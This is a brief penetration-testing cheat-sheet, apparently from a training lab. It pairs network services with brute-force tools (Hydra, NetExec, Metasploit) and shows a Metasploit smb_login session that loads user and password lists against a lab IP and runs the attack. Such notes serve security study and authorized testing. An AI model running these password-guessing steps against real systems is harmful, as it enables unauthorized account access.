
# WINRM -> NETEXEC
# RDP SSH -> HYDRA
# SMB -> HYDRA
# SMBV3+ -> metasploit
```shell-session
use auxiliary/scanner/smb/smb_login

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

```
